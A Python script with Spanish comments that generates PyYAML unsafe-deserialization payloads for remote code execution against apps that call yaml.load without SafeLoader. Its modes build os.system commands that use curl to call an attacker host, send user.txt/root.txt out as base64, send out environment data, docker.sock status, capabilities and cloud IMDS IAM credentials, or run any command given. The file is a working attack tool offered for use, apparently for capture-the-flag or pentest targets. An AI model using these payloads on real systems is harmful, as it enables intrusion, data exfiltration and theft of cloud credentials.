#!/usr/bin/env python3
"""
Generador de payloads de deserializacion insegura de PyYAML -> RCE

Si una aplicacion pasa input controlado por el usuario a yaml.load() sin usar
SafeLoader, se puede abusar de los tags de PyYAML (!!python/object/apply) para
invocar os.system y ejecutar comandos arbitrarios durante el parseo.

Este script genera los YAML maliciosos listos para enviar al endpoint vulnerable.

Uso:
    # payload simple de RCE que hace un callback a tu server
    python3 pyyaml-rce-payload.py --lhost ATACANTE_IP --mode ping

    # payload que exfiltra user.txt / root.txt por HTTP (base64)
    python3 pyyaml-rce-payload.py --lhost ATACANTE_IP --mode exfil

    # payload de enumeracion (entorno, docker.sock, caps, IMDS de la nube)
    python3 pyyaml-rce-payload.py --lhost ATACANTE_IP --mode enum

    # comando arbitrario
    python3 pyyaml-rce-payload.py --cmd "id; hostname"
"""
import argparse


def build(cmd):
    # tag de PyYAML que invoca os.system(cmd) al deserializar
    return f'!!python/object/apply:os.system ["{cmd}"]\n'


def main():
    ap = argparse.ArgumentParser(description="Generador de payloads PyYAML RCE")
    ap.add_argument("--lhost", help="IP de tu server para callbacks/exfil")
    ap.add_argument("--lport", default="8000", help="puerto de tu server (default 8000)")
    ap.add_argument("--mode", choices=["ping", "exfil", "enum"],
                    help="payload predefinido")
    ap.add_argument("--cmd", help="comando arbitrario (sobrescribe --mode)")
    ap.add_argument("-o", "--out", help="guardar el YAML en un archivo")
    args = ap.parse_args()

    if args.cmd:
        cmd = args.cmd
    elif args.mode == "ping":
        cmd = f"curl -s http://{args.lhost}:{args.lport}/RAWYAML_RCE"
    elif args.mode == "exfil":
        cmd = ("X=$( (id; hostname; echo ---FIND---; "
               "find / -name user.txt 2>/dev/null; echo ---CAT---; "
               "cat /home/*/user.txt /root/user.txt 2>/dev/null) | base64 -w0 ); "
               f"curl -s http://{args.lhost}:{args.lport}/EXFIL_$X")
    elif args.mode == "enum":
        cmd = ("X=$( (echo ==ENV==; env; echo ==CGROUP==; cat /proc/1/cgroup; "
               "echo ==DOCKERSOCK==; ls -la /var/run/docker.sock /run/docker.sock 2>/dev/null; "
               "echo ==COREPAT==; cat /proc/sys/kernel/core_pattern; "
               "echo ==CAPS==; grep -i cap /proc/self/status; echo ==ID==; id; "
               "echo ==IMDS==; curl -s --max-time 3 "
               "http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null"
               f") | base64 -w0 ); curl -s http://{args.lhost}:{args.lport}/ENUM_$X")
    else:
        ap.error("especifica --mode o --cmd")

    payload = build(cmd)
    if args.out:
        with open(args.out, "w") as f:
            f.write(payload)
        print(f"[+] payload escrito en {args.out}")
    else:
        print(payload, end="")


if __name__ == "__main__":
    main()
